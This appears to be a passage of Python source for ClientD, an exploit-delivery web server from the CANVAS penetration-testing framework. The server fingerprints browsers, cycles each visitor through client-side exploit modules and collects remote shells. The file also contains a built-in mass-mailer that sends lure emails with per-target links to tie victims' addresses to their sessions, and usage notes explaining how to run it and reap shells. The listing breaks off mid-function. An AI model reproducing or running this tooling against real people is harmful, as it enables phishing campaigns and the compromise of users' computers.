##ImmunityHeader v1
###############################################################################
## File       :  clientd.py
## Description:  WSGI based clientsiding engine
##            :
## Created_On :  Wed Sep  2 09:25:43 2009
## Created_By :  Bas Alberts
## Modified_On:  Thu Jan  7 07:47:11 2010
## Modified_By:  Justin Seitz
## Modified_By:  Bas Alberts
## (c) Copyright 2009, Immunity Inc all rights reserved.
###############################################################################

from __future__ import with_statement

NOTES = """
ClientD was written to allow the concurrent exploitation of
multiple clients. It operates on a session id logic that has
an associated active module and allowed exploit list.

Every active module is a unique instance of a makesploit FSM and
the session id logic allows for client session identification.

This translates to a HTTP Server that can exploit multiple clients
in parellel, with different exploits, in different phases of
their exploitation process. This is useful when you expect to
own more than one client, or when going after multiple clients
that share the same source address (think NAT or proxy).

The actual exploitation logic is based on a simple list walk.
Every session gets a copy of the master 'allowed' list, when
an exploit module is done, it is popped from the allowed list
for that session, and the session is then switched to the
next module in the allowed list ... we can walk this list using
a combination of redirect-to-self logic and some dirty HTML
trickery. ClientD can also automatically add additional exploits
based on extracted recon data from js_recon, in this case auto-detected
exploits are given priority over user-supplied exploits.

1) Client connects as MSIE, gets session cookie from server
2) Server inits session with first entry of session allowed list
3) Server redirects client to state 1 of makesploit FSM
4) Client cycles through the FSM
5) When timeout of makesploit FSM for active module is
reached, server switches active module for session to
next entry in allowed list by a previously inited refresh to
'/next_in_list/'
6) Repeat 3-5, until session allowed list has been exhausted ...


When you are finished using ClientD, simply select it from the list
of running exploits, and click the 'Stop Exploit' button. This will shut down
the ClientD server and attempt to generate a report giving a high-level idea
of how many clients were vulnerable to particular exploits. This should be
automatic but if you need to start oowriter manually do so with the following
command:

oowriter -accept='socket,host=localhost,port=2002;urp;'


NOTE:

This server also allows for full independent commandline usage
including multiple shell handling, as it operates with an
XMLRPC CommandLine capable instance of the engine on the
commandline. If you _ARE_ running this from the commandline
you can not have a GUI instance of CANVAS running.

For proper commandline operation set -l to the ip of the
interface you want to bind callbacks on.

You have some control over list walk semantics from your exploit. If your
exploit does not want to be walked over, set self.refresh_rate to 0 ... this
is useful when you know your exploit is going to freeze the browser, or needs
the active session to stay there.

You can think of this as 'my exploit never times out', where
self.refresh_rate controls the exploit timeout for your module.
You should only need to do this for exploits who's payload does
not escape the initial browser process.

e.g. java_deserialize needs the active session to be alive on the
java applet for you to be able to interact with commands. Thus
it can not be switched over to a next exploit attempt if it succeeds.
As that would kill the running applet.

A good 'allowed' list would then be 'all the exploits that get
out of the browser' followed by 'exploit that does not get out
of the browser process'

Right now most of our clientsides get out of the browser process
so practically just keeping java_deserialize as a single shot or
as the lest entry of the allowed list should work fine.

Note that for the session management to work, the targeted
browser has to accept simple cookies from the ClientD. This is the
default on all major browsers. This session management database
is stored in the engine, so it is common to all instances of ClientD
you may be running.

### EXAMPLE ### EXAMPLE ### EXAMPLE ### EXAMPLE ### EXAMPLE ###

Example commandline usage (make sure you have no CANVAS GUI running):

1) Edit the allow list to your liking and start ClientD, the -l
option correlates to the interface you want to receive your callbacks
on:

python ./exploits/clientd/clientd.py -l 192.168.1.100

2) Wait for clients to connect, ClientD will do its thing
in a fully automated fashion:

e.g.

...
192.168.1.102 - - [11/Aug/2009 17:32:36] "GET /SiteException.jar HTTP/1.1" 200 11475
[+] got existing session cookie
[+] HTTP_SESSION_ID: 1250026340.09
[+] HTTP_COOKIE: CANSessID=1250026340.09
[+] SERVER_PROTOCOL: HTTP/1.1
[+] QUERY_STRING:
[+] REQUEST_METHOD: GET
[+] HTTP_RAW_HEADERS: ['User-Agent: Mozilla/4.0 (Windows 2000 5.0) Java/1.5.0_04\r\n', 'Host: 192.168.1.100:8080\r\n', 'Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n', 'Connection: keep-alive\r\n', 'Content-type: application/x-www-form-urlencoded\r\n', 'Cookie: CANSessID=1250026340.09\r\n']
[+] HTTP_CONNECTION: keep-alive
[+] BODY_DATA:
[+] HTTP_RAW_REQUEST: GET /SiteException.jar HTTP/1.1
[+] CONTENT_LENGTH:
[+] HTTP_USER_AGENT: Mozilla/4.0 (Windows 2000 5.0) Java/1.5.0_04
[+] HTTP_HOST: 192.168.1.100:8080
[+] HTTP_ACCEPT: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
[+] REMOTE_ADDR: 192.168.1.102
[+] CONTENT_TYPE: application/x-www-form-urlencoded
[+] REMOTE_HOST:
[+] PATH_INFO: /SiteException.jar
[+] continue existing exploit session for client
...

3) Reap your shells by attaching to the commandline engine instance
with the xmlrpc client (note do NOT shut down the server, this is where
your active shells are):

work@work-desktop:/media/disk/svn/CANVAS$ python cmdline.py
...
Setting CANVAS session to: default
Using 'Reports/default' as base data output directory
 _____ _____ _____ _____ _____ _____
|     |  _  |   | |  |  |  _  |   __|
|   --|     | | | |  |  |     |__   |
|_____|__|__|_|___|\___/|__|__|_____|
         *** XMLRPC cmdline v0.1 ***

<<<CANVAS>>> nodes
[+] Listing all active nodes
ID: 0 - win32Node:0->0
ID: 1 - JavaNode:0->1
[+] Listed all active nodes
<<<CANVAS>>>

...

The above nodes were reaped from 2 different clients on 2 different
platforms, browsing to ClientD at the same time. This should
scale moderately well (or better than the old httpserver anyways)

AutoSpam mode:
==============

ClientD also includes an integrated spamming engine which, when
enabled, will automatically generate unique URI's for every target
email supplied. When someone clicks that unique URI that session
will automagically be associated with the target email sent out from
the spammer. This allows for very good clientside-to-target correlation
and coverage statistics.

e.g.:

# python26 ./exploits/clientd/clientd -O spam:1 -O server_port:80 -O spam_targets:targets.txt -l remote.ip

Would import a list of targets from targets.txt, and then spam them
unique URI based on self.mail_from/self.subject/self.spam in the Spammer()
object.

If you have a custom SMTP server that you would like to use, you tunnel mail through a local SSH tunnel,
or have setup a SMTP relay specifically to do SPAM, then you can set the following options in the
canvas.conf file (they are commented out by default):

# preferred smtp server for sending spam
preferred_smtp_host         = localhost
preferred_smtp_port         = 1025


Subsequent visits from the targeted client/person will then be logged
with full target correlation, which looks like (details censored):

### Client Request @ Wed Aug 26 14:33:16 2009 ###
HTTP_COOKIE:'CANSessID=1251311592.55'
QUERY_STRING:''
REQUEST_METHOD:'GET'
HTTP_KEEP_ALIVE:'300'
SERVER_PROTOCOL:'HTTP/1.1'
...XXX...
CONTENT_LENGTH:''
HTTP_ACCEPT_CHARSET:'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
HTTP_USER_AGENT:'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.13) Gecko/XXX XXX/XXX (XXX) Firefox/XXX'
HTTP_CONNECTION:'keep-alive'
HTTP_RAW_REQUEST:'GET /index.html HTTP/1.1\r\n'
REMOTE_ADDR:'72.28.155.218'
BODY_DATA:''
HTTP_SESSION_ID:'1251311592.55'
HTTP_HOST:'72.46.249.24'
HTTP_ACCEPT:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
HTTP_ACCEPT_LANGUAGE:'en-us,en;q=0.5'
CONTENT_TYPE:'text/plain'
SESSION_TARGET:'bas@immunityinc.com'
REMOTE_HOST:''
HTTP_ACCEPT_ENCODING:'gzip,deflate'

You can see the SESSION_TARGET variable for every request in that session will now
be associated with the originally targeted email that supplied the URI from which
the session was initiated.

TODO:

- gzip support
- gui glade
- better default allowed list (requires QA on existing clientsides)
- documentation dictionary

"""

import os
import sys
import socket
import time
from threading import Thread, Lock
import Queue
import select
import mimetypes

if '.' not in sys.path:
    sys.path.append('.')

# wsgi deps
import urllib
import Cookie
from wsgiref.handlers import SimpleHandler
from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer

# parse deps
import urllib2

# ssl deps
from SocketServer import ThreadingMixIn
if '../../libs' not in sys.path:
    sys.path.append('../../libs')

from libs.tlslite.api import TLSSocketServerMixIn
from libs.tlslite.api import SessionCache
from libs.tlslite.api import X509
from libs.tlslite.api import X509CertChain
from libs.tlslite.api import parsePEMKey

# canvas 6 deps
from internal import devlog
import canvasengine
from canvasengine import (WIN32MOSDEF, JAVASERVER, HTTPMOSDEF, HTTPMOSDEF_SSL)
from exploitutils import *

from ExploitTypes.utility import Utility
from engine.config import canvas_resources_directory

from CLI.xmlrpc import StartServerThread
from timeoutsocket import Timeout

# SMTP Spammer that can do session to email correlation ...
import hashlib
import smtplib
import logging

# dns lib dependencies for MX resolving
from libs.udns import resolver

from libs import spkproxy


NAME            = 'ClientD'
DESCRIPTION     = 'HTTP Server for client side vulnerabilities'
VERSION         = '1.0'
DOCUMENTATION   = {}
DOCUMENTATION["NOTES"]=NOTES

PROPERTY        = { 'TYPE' : 'Servers' }

# these will be added to any new or favorite client-sides in the current release
DEFAULT_ATTACK_MODULES = [
    'java_AtomicReferenceArray',
    'flash_APSB11_18',
    'acrobat_js4',
    ]

DEFAULT_RESPONSE_TEMPLATE = """<html>
<head>
<title>Hi Friend!</title>
</head>
<frameset rows="*,1px">
    <frame src="http://www.immunityinc.com/" frameborder="0" noresize="noresize" />
    <frame src="/e/" frameborder="0" scrolling="no" noresize="noresize" />
</frameset>
</html>
"""

EXPLOIT_RESPONSE_TEMPLATE = '[EXPLOIT_RESPONSE]'

JAVASCRIPT_RESPONSE_TEMPLATE = """<html>
<head>
<title>Hi Friend!</title>
</head>
<body>
    <script type="text/javascript" src="js_progress_bar.js"></script>
    <iframe width="100%" height="600" src="/e/"></iframe>
</body>
</html>
"""

class GeoIPSupport:
    def __init__(self):
        self.GeoIP = None
        try:
            # CANVAS shipped geoip
            import libs.pygeoip as GeoIP
            try:
                db_path = os.path.join('gui', 'WorldMap', 'GeoLiteCity.dat')
                self.GeoIP = GeoIP.GeoIP(db_path, GeoIP.MEMORY_CACHE)
            except Exception:
                logging.error('Could not load geoip database')
                pass
        except ImportError, err:
            pass

    def get_geoip(self, addr):
        """ get geoip info """
        gir = {}
        if self.GeoIP != None:
            try:
                gir = self.GeoIP.record_by_addr(addr)
            except Exception:
                logging.error('Could not query geoip database')
                self.GeoIP = None
        return gir

STATE_ATTACK = 'ATTACK'
STATE_RECON = 'RECON'
STATE_DONE = 'DONE'

def add_default_headers(response_headers):
    """
    Add our standard headers to the response_headers objects we send back
    """
    # no cache
    response_headers.append(('Cache-Control',
                             'no-cache, no-store, max-age=0, must-revalidate'))
    response_headers.append(('Pragma', 'no-cache'))
    # http://adamyoung.net/IE-Blocking-iFrame-Cookies
    # have IE accept our existing session cookie inside the iframe
    response_headers.append(('P3P',
        'CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"'))

def exploit_key(x):
    """
    Used for sort() below
    """
    if not hasattr(x, "vuln_value"):
        return 0
    return x.vuln_value

class SessionState(object):
    """
    One session's current state. A session is one Web Browser session, which
    is linked to a single email address potentially.
    """
    def __init__(self, log=None, sid=None, loader=None, engine=None, request_env=None, manager = None):
        #valid states are "RECON" and "ATTACK" and "DONE"
        self._state=STATE_RECON
        self.sid=sid
        self.loader=loader
        self.engine = engine #a copy of theexploit's self.engine so we can send events
        self.manager = manager #SessionManager object.
        self.recon_index = 0
        self.recon_info = None #the information we get from doing recon

        self.ip=None

        #get the remote host and store it off. We assume there is only one
        #remote IP connecting to each session, which is 99.99% correct.
        #theoretically we could store other things as well.
        if request_env:
            self.ip=request_env.get("REMOTE_ADDR")
            self.first_request = request_env

        # add client ip to CANVAS
        self.loader.canvasobj.argsDict['passednodes'][0].new_host(self.ip)

        self.user_agent=""
        if request_env:
            self.user_agent=request_env.get("HTTP_USER_AGENT","")
            devlog("clientd", "User-Agent was set to: %s"%self.user_agent)

        self.recon=[]
        self.attack_index = 0
        self.attack = []

        if self.loader:
            #fill up our lists with theexploit() types! :>
            for name in loader.recon:
                newexploit=loader.get_module_object(name)
                if newexploit:
                    devlog("clientd", "Loaded recon: %s"%name)
                    newexploit.server_callback = self.recon_callback
                    self.recon.append(newexploit)
                else:
                    devlog("clientd", "Could not load exploit: %s"%name)

            for name in loader.allowed_attack_modules:
                try:
                    newexploit = loader.get_module_object(name)
                except canvasengine.CANVASENGINEException:
                    newexploit = None
                if newexploit:
                    devlog("clientd", "Loaded attack: %s"%name)
                    self.attack.append(newexploit)
                else:
                    devlog("clientd", "Could not load exploit: %s"%name)

        self.email = None #the original email we sent to!

        #if we get a callback, we set this value
        self.successful_exploit = None

        if log:
            #a real logging function is always nice! :>
            self.log=log

        self.initial_time = time.asctime()

        report_args = {
            "email": self.email,
            "sid": self.sid,
            "ip": self.ip,
            "user agent": self.user_agent,
            "first request": self.first_request
            }
        engine.new_event("clientd new session", report_args, 'clientd')

    def _get_state(self):
        return self._state
    def _set_state(self, state):
        if state == STATE_ATTACK:
            # make sure attack inform clientd when they have succeeded
            for exploit in self.attack:
                exploit.inform_succeeded.append(self)
        self._state = state
    state = property(_get_state, _set_state)

    @property
    def current_exploit(self):
        #
        # We are basically replicating the logic implemented in get_response()
        # This will now be called on OPTIONS in order to check if the current module
        # is able to handle the OPTIONS request, and fallback to the default
        # OPTIONS response in case it doesn't
        #
        if self.state == STATE_RECON:
            if len(self.recon):
                return self.recon[self.recon_index]
            else:
                self.state = STATE_ATTACK

        if self.state == STATE_ATTACK:
            if (len(self.attack)):
                return self.attack[self.attack_index]
            else:
                self.state = STATE_DONE
                return None

    def log(self, msg ):
        """override me in __init__ please"""
        print msg

    def registerWebDavDirectory(self, share_name):
        ret = self.manager.registerWebDavShare(share_name, self)
        return ret

    def get_response(self, client_header, client_body):
        """
        Get the response from the currently active exploit. If error, return None, None.
        """
        devlog("clientd", "Getting response from session object: %s" % self.sid)

        if not len(self.recon) and self.state == STATE_RECON:
            self.state = STATE_ATTACK # people might not want to do recon ...

        if not len(self.attack) and self.state == STATE_ATTACK:
            self.state = STATE_DONE # people might only want to recon ...

        report_args = {
            "ip": self.ip,
            "email": self.email,
            "sid": self.sid,
            }

        if self.state==STATE_RECON:
            exploit=self.recon[self.recon_index]
            #give the exploit access to our recon information and ourselves
            exploit.sessionstate = self

            report_args['attack type'] = 'recon'

        elif self.state==STATE_ATTACK:
            exploit=self.attack[self.attack_index]
            #give the exploit access to our recon information and ourselves
            exploit.sessionstate = self
            if self.recon_info:
                exploit.plugin_info=self.recon_info

            report_args['attack type'] = 'attack'

        else:
            devlog("clientd", "State is %s - no need to attack this session anymore" % self.state)
            return None, None

        report_args["attack"] = exploit.module_name
        self.engine.new_event("clientd attack", report_args, 'clientd')

        logging.info("Replying using exploit: %s" % exploit.name)
        server_header, server_body = exploit.makesploit(client_header, client_body)

        return server_header, server_body

    def increment(self):
        """
        Move to next module or state
        """
        devlog("clientd", "Incrementing session state %s" % self.sid)
        if self.state==STATE_RECON:
            if self.recon_index==len(self.recon)-1:
                if not len(self.attack):
                    devlog("clientd", "We have no attacks - so we are done")
                    self.state=STATE_DONE
                else:
                    #move to attack if done with recon
                    self.state=STATE_ATTACK
                    if self.recon_info:
                        #must copy here since we remove things from the list in the loop
                        for exploit in self.attack[:]:
                            #before moving to attack need to use recon information
                            #to reorder attack modules (and remove ones that report 0 for is_vulnerable())
                            if hasattr(exploit, "is_vulnerable"):
                                exploit.sessionstate = self # make sure they know about us!
                                logging.info("Checking target vulnerability to: %s" % exploit.name)
                                vuln_value = exploit.is_vulnerable(self.recon_info)
                            else:
                                logging.info("Exploit %s is not compatible with ClientD - no is_vulnerable() function!" % exploit)
                                vuln_value=0
                            if not vuln_value:
                                devlog("clientd", "Removing %s from our exploit list for this session: %s" % (exploit.name, self.sid))
                                self.attack.remove(exploit)
                            exploit.vuln_value = vuln_value
                            #we don't reorder them in "best order" yet. But we should! :>


                        #Sort is increadibly un-thread-safe!
                        #reverse=True will sort this in "best exploit" order.
                        #False will sort this in "Worst Exploit Order"
                        self.attack.sort(key=exploit_key, reverse=True)
                        devlog("clientd", "Sorted list of exploits: %s" % repr(self.attack))

                    attack_list = [attack.module_name for attack in self.attack] #names of all attacks

                    report_args = {
                        "ip": self.ip,
                        "email": self.email,
                        "sid": self.sid,
                        "attacks": attack_list,
                        "recon": self.recon_info,
                        }
                    self.engine.new_event("clientd attacks", report_args, 'clientd')
            else:
                #need to increment to next recon state
                #first, tell that recon module it's done (in case it had servers to set up)
                self.recon[self.recon_index].done()
                self.recon_index+=1
        elif self.state==STATE_ATTACK:
            #need to move to next attack module or DONE
            self.attack[self.attack_index].done()
            if self.attack_index==len(self.attack)-1:
                #move to done if done with attack
                self.state=STATE_DONE
                attack_list = [e.module_name for e in self.attack] #names of all attacks

                report_args = {
                    "email": self.email,
                    "sid": self.sid,
                    "attacks": attack_list,
                    "ip": self.ip,
                    }
                self.engine.new_event("clientd finished attacks", report_args, 'clientd')

            else:
                self.attack_index+=1
        else:
            devlog("clientd", "State is done yet still incrementing? Sid=%s"%self.sid)

    def child_succeeded(self, exploit):
        """
        The engine will pass the exploit to us that succeeded here!
        """
        # finish this exploit (turn of TFTPD servers and such)
        exploit.done()

        if self.successful_exploit:
            logging.info("Exploit %s succeeded on SID %s but we already were successful!"%(exploit.name, self.sid))
            #not ideal, but some exploits succeed twice...
            return

        self.successful_exploit = exploit

        if self.email:
            logging.info("Exploit %s succeeded against SID: %s Email: %s!"%(exploit.name, self.sid, self.email))
        else:
            logging.info("Exploit %s succeeded against SID: %s !"%(exploit.name, self.sid))

        report_args = {
            "email": self.email,
            "sid": self.sid,
            "attack": exploit.module_name,
            "ip": self.ip,
            "remote_ip": self.ip,
            }
        self.engine.new_event("clientd successful attack", report_args, 'clientd')

        self.state = STATE_DONE #we are done! :>

    def done(self):
        """returns true if we are in the DONE state"""
        return self.state==STATE_DONE

    def succeeded(self):
        """ Did we succeed? """

        if self.successful_exploit:
            return True

        #otherwise, time to do a quick check
        for exploit in self.attack:

            if exploit.succeeded:
                self.child_succeeded(exploit)
                return True

        return False

    def parse_plugin_data( self, plugin_info ):
        """
        Parse the plugin data as sent to us by js_recon
        """
        clean_plugins = {}

        for key in plugin_info:
            data = plugin_info[key][0]

            # Standardize the input so we can cleanly parse version numbers
            char_filter_list = [",","_"]
            word_filter_list = ["Plugin","Plug-in"]

            # Replace bad chars with '.'
            for i in char_filter_list:
                key  = key.replace(i,".")
                data = data.replace(i,".")

            # Remove words we don't want included
            for i in word_filter_list:
                key = key.replace(i,"")
                data= data.replace(i,"")

            clean_plugins[key] = data

        return clean_plugins

    def recon_callback(self, name, clientheader, clientbody):
        """
        Handles recon bodydata that comes back from a js_recon module
        """
        try:
            plugin_info = urllib2.urlparse.parse_qs(''.join(clientbody.data))
        # Python 2.5 uses the cgi.parse_qs so try that
        except AttributeError:
            import cgi
            plugin_info = cgi.parse_qs(''.join(clientbody.data))
        except Exception:
            devlog("clientd", '[+] failed to parse plugin info ...')
            return False
        devlog("clientd", "All plugin info: %s"%repr(plugin_info))

        #set the info_dict so exploits can auto-target
        info_dict       = {}
        info_dict['plugins'] = self.parse_plugin_data( plugin_info )
        info_dict['user_agent'] = clientheader.getStrValue(['User-Agent'])
        self.recon_info=info_dict
        return True

    #########################################################
    #End of SessionState object
    #########################################################

class SessionManager(object):
    """
    Manages all the sessions for this clientd instance
    """
    def __init__(self, log=None, loader=None, engine=None):
        self.sessions = {}
        if log:
            self.log=log

        self.loader = loader
        self.engine = engine
        self.web_dav_shares = []

    def log(self, msg):
        """override me in __init__ please!"""
        logging.info("SessionManager Log: %s" % msg)

    def registerWebDavShare(self, sharename, session):
        """ Register your sharename in our list of them """
        #quicky look for duplicates.
        for n_sharename, n_session in self.web_dav_shares:
            if sharename in n_sharename:
                if session!=n_session:
                    devlog("clientd", "Duplicate sharenames requested:%s->%s!"%(n_sharename,sharename))
                    return False
        self.web_dav_shares+=[(sharename, session)]
        return True

    def getWebDavShares(self):
        """
        Returns a list of tuples of (directories, session objects)
        """
        return self.web_dav_shares

    def new_session(self, sid, request_env):
        """
        Creates a new session object, stores it in our dictionary,
        and returns it.
        """
        devlog("clientd", "new_session(%s)"%sid)
        session = SessionState(log=self.log, sid = sid, loader=self.loader,
                               engine=self.engine, request_env=request_env,
                               manager = self)
        #save it off
        self.sessions[sid] = session
        return session

    def get_session(self, sid):
        """
        Returns the session associated with sid
        """
        return self.sessions.get(sid)


class FeedSpam(Thread):
    """
    This class feeds new emails to an existing clientD instance.
    """
    def __init__(self, active_spammer):
        Thread.__init__(self)
        port                = 61234
        self.active_spammer = active_spammer
        self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('', port))
        self.s.listen(5)

    def run(self):
        while True:
            try:
                conn, addr = self.s.accept()
                logging.info('FeedSpam connected to by %s' % addr[0])
                raw_targets = ''
                while True:
                    rlist, wlist, xlist = select.select([conn], [], [], 4)
                    if conn in rlist:
                        data = conn.recv(1024)
                        if data:
                            raw_targets += data
                    else:
                        logging.warning("Feed timeout! Adding new targets")
                        break
                targets = raw_targets.split('\n')
                # unique it
                targets = set(targets)
                # hash it
                print repr(targets)
                for t in targets:
                    t = t.replace('\n', '')
                    # only spam new emails ...
                    if t and t not in self.active_spammer.targetdict:
                        md5sum = hashlib.md5(t).hexdigest()
                        self.active_spammer.dictlock.acquire()
                        self.active_spammer.targetdict[t]      = md5sum
                        self.active_spammer.hashdict[md5sum]   = t
                        self.active_spammer.dictlock.release()
                        self.active_spammer.sendqueue.put(t)
                        logging.info('Spam Feeder added target: %s' % t)
                    else:
                        logging.warning('Skipping empty|existing target')
            except Timeout:
                pass
            except Exception as e:
                logging.error('Spammer error: %s' % e)
                break
                
    def stop(self):
        self.s.close()

class Spammer(Thread):
    """
    Sends the actual emails to our targets.
    """
    def __init__(self, base_uri, tlist, smtp_server='', smtp_port=0, mxresolve=True):
        Thread.__init__(self)
        self.targetdict = {}
        self.hashdict   = {}
        self.mx_cache   = {}
        # put {URIREPLACE} where you want your URI
        self.mail_from  = 'root@eruditorum.org'
        self.subject    = 'check me out'
        self.file       = ""
        self.base_uri   = base_uri
        self.tlist      = tlist
        self.smtp_server= smtp_server
        self.smtp_port  = smtp_port
        self.mxresolve  = mxresolve
        self.spam       = """
Dear Friend,

Please visit {URIREPLACE}

Love,
Enoch
"""
        self.sendqueue  = Queue.Queue()
        self.dictlock   = Lock()

        # init a feeding mechanism so you can add new targets
        # this works by just catting a newline seperated list
        # of new emails to 127.0.0.1:61234

        self.feed = FeedSpam(self)
        self.feed.setDaemon(True)
        self.feed.start()

    def import_targets(self):
        """ takes in newline seperated list of email addresses """
        targets = []
        # if it's a string ... assume open file mode
        if type(self.tlist) == type(''):
            try:
                targets = open(self.tlist, 'r').readlines()
            except Exception, err:
                logging.error('Could not import target list')
                return False
        # if it's a list ... assume internal list mode
        elif type(self.tlist) == type([]):
            targets = self.tlist
        else:
            logging.error('Did not get properly formatted target list')
            return False
        # unique it
        targets = set(targets)
        # hash it
        for t in targets:
            t = t.replace('\n', '')
            if t:
                md5sum                  = hashlib.md5(t).hexdigest()
                self.dictlock.acquire()
                self.targetdict[t]      = md5sum
                self.hashdict[md5sum]   = t
                self.dictlock.release()
                self.sendqueue.put(t)
            else:
                logging.warning('Skipping empty target line')
        return True

    def end_spammer(self):
        self.sendqueue.put('<ENDSPAM>')
        self.feed.stop()

    def spam_targets(self):
        """ spam out emails to targets """
        k = self.sendqueue.get()
        while k != '<ENDSPAM>':
            uri     = self.base_uri + '/' + self.targetdict[k]
            spam    = self.spam.replace('{URIREPLACE}', uri)
            logging.info('Sending: %s to %s' % (uri, k))
            try:
                domain = k.split('@')[1]
                if domain not in self.mx_cache:
                    mx_records = resolver.query(domain, 'MX')
                    for record in mx_records:
                        print record.to_text()
                    # just use the first one
                    if len(mx_records):
                        smtpd = mx_records[0].to_text()
                        smtpd = smtpd.split(' ')[1]
                        logging.info('Found smtpd as %s from MX record' % smtpd)
                        self.mx_cache[domain] = smtpd
                    else:
                        k = self.sendqueue.get()
                        continue
                else:
                    smtpd = self.mx_cache[domain]
                    logging.info('Pulled smtpd %s out of MX cache' % smtpd)
            except Exception:
                import traceback
                traceback.print_exc(file=sys.stderr)
                logging.error('Trouble parsing out domain for %s' % k)
                k = self.sendqueue.get()
                continue

            if self.mxresolve or not self.smtp_server:
                logging.info('Attempting to use remote SMTP host')
                try:
                    sender  = smtplib.SMTP(smtpd, 25)
                    #sender.set_debuglevel(1)

                except smtplib.SMTPRecipientsRefused:
                    logging.error("Recipient refused")
                except smtplib.SMTPDataError:
                    logging.error("SMTP server refused to accept the message data")
                except smtplib.SMTPConnectError:
                    logging.error("Connect error")
                except smtplib.SMTPHeloError:
                    logging.error("Server refused HELO")
                except Exception:
                    logging.warning("Can't use a remote SMTP server. So we'll use our own")
                    logging.info("Using: %s:%d" % (self.smtp_server, self.smtp_port))

                    sender = smtplib.SMTP(self.smtp_server,port=self.smtp_port)
                    sender.set_debuglevel(1)
            else:
                logging.info("Attempting to use preferred SMTP host %s:%s" % (self.smtp_server, self.smtp_port))
                sender = smtplib.SMTP(self.smtp_server, port=self.smtp_port)
            
            if self.file:
                if not os.path.isfile(self.file) or not os.path.exists(self.file):
                    logging.error("Attachment has to be a regular file")
                    continue
                from email.MIMEMultipart import MIMEMultipart
                from email.MIMEBase import MIMEBase
                from email import Encoders
                msg = MIMEMultipart()
                msg['Subject'] = self.subject 
                msg['From'] = self.mail_from
                msg['To'] = k
                part = MIMEBase('application', "octet-stream")
                part.set_payload(open(self.file, "rb").read())
                Encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(self.file))
                msg.attach(part)
            
            else:
                spam = "From: %s\r\nTo: %s\r\nSubject: %s\r\n\r\n%s" % (
                        self.mail_from, k, self.subject, spam)

            try:
                if self.file:
                    sender.sendmail(self.mail_from, k, msg.as_string())
                else:
                    sender.sendmail(self.mail_from, k, spam)
                sender.quit()
            except Exception:
                logging.error("Unable to send mail, no SPAM being sent")

            # next ...
            k = self.sendqueue.get()
        return True

    def run(self):
        """ import targets and spam them """
        self.import_targets()
        return self.spam_targets()

class ModuleLoaderC6(object):
    """
    Responsible for loading CANVAS6 exploit modules
    """

    def __init__(self, canvasobj, allowed = None, recon = None, domain = '', auto_detect_exploits = False, log=None):

        self.auto_detect_exploits   = auto_detect_exploits

        #we override our default log function here so we can do something other than "print" log messages
        if log:
            self.log=log

        if recon == None:
            self.recon = []
        else:
            self.recon = recon

        if allowed == None:
            self.allowed_attack_modules = []
        else:
            self.allowed_attack_modules = allowed

        if self.auto_detect_exploits:

            self.available = self.get_all_modules() #dictionary of [name]=modules
            self.allowed_attack_modules = self.available.keys()
            #don't duplicate recon modules in our allowed list
            for key in self.recon:
                if key in self.allowed_attack_modules:
                    self.allowed_attack_modules.remove(key)
        else:
            self.available = {} #not used if not auto-detecting

        self.canvasobj              = canvasobj
        self.domain                 = domain

    def log(self, msg):
        """stub logger - we override this in our __init__"""
        print msg

    def get_all_modules(self):
        """
        Retrieve all clientside modules from canvas engine
        IN  : ...
        OUT : dictionary of all available clientside exploits
        """
        #we must first register all modules to be sure they are available
        canvasengine.registerAllModules()

        #now we can go through and figure out which ones we can use.
        all_clientsides = {}
        mods = canvasengine.exploitmodsGet()
        for name, mod in mods.iteritems():
            """
            To work inside clientd you must:
            1. Implment the callback's it needs (based on spike proxy HTTP library essentially)
            2. Derive from httpclientside

            To work with the auto-choose-your-exploits setting, you need to also implement is_vulnerable.

            Listeners must be either HTTP (Win32 exploits currently should support both) or UNIVERSAL (Java/Linux Exploits)

            You must also not have a variable called "no_auto_detect" (some exploit turn this off)
            """

            from httpclientside import httpclientside
            if not hasattr(mod, "theexploit"):
                devlog("clientd", "module %s has no theexploit class!" % name)
                continue

            if issubclass(mod.theexploit, httpclientside):
                exploit = mod.theexploit()
                listener_type = exploit.neededListenerTypes()
                has_is_vulnerable = hasattr(exploit,"is_vulnerable")
                devlog('clientd', '[+] Adding clientside: %s. Listener: %s. is_vulnerable: %s'% (name, listener_type, has_is_vulnerable))

                valid_listener_types = [canvasengine.HTTPMOSDEF, canvasengine.HTTPSMOSDEF,
                    canvasengine.DNSMOSDEF, canvasengine.UNIVERSAL_MOSDEF]
                if listener_type and listener_type[0] not in valid_listener_types:
                    devlog("clientd", "Exploit does not have correct Listener type to be used by clientd")
                    continue

                if self.auto_detect_exploits and not has_is_vulnerable:
                    devlog("clientd", "Exploit %s does not have is_vulnerable function, not adding this one" % name)
                    continue

                if hasattr(exploit,"no_auto_detect"):
                    devlog("clientd"," Don't use this exploit: %s when auto_detecting" % name)
                    continue
                all_clientsides[name] = mod

        devlog("clientd", "Number of modules in our list: %s" % len(all_clientsides))
        return all_clientsides

    def get_useable_modules(self, user_agent = ''):
        """
        get useable modules for this useragent filter
        IN  : optional user_agent filter string
        OUT : dictionary of matching clientside exploits
        """
        useable_clientsides = {}
        if not len(user_agent):
            # match * on no user agent
            return self.available
        for mod in self.available:
            if hasattr(self.available[mod], 'searchMethod') and \
               self.available[mod].searchMethod(user_agent):
                useable_clientsides[mod] = self.available[mod]
        return useable_clientsides

    def get_module_object(self, name, set_listener = True):
        """
        Get and init an exploit module
        IN  : name of module to load, set_listener True/False
        OUT : module instance
        """
        module = canvasengine.getModule(name)
        if not module:
            devlog("clientd", '[+] The engine could not find clientside with name: %s' % name)
            return None
        exploit = module.theexploit()
        # attribute sanity check ... extend if needed
        for a in ['makesploit']:
            if not hasattr(exploit, a):
                devlog("clientd", '[+] Module %s does not have attribute: %s' % (name, a))
                return None

        # link in the exploit to the canvasobj
        if getattr(exploit, "supports_dns_mosdef", False):
            exploit.DNSMOSDEF = self.canvasobj.dnsmosdef
            if exploit.DNSMOSDEF:
                self.log('Choosing DNS listener for %s' % name)
        else:
            exploit.DNSMOSDEF = False

        exploit.HTTPMOSDEF       = self.canvasobj.httpmosdef
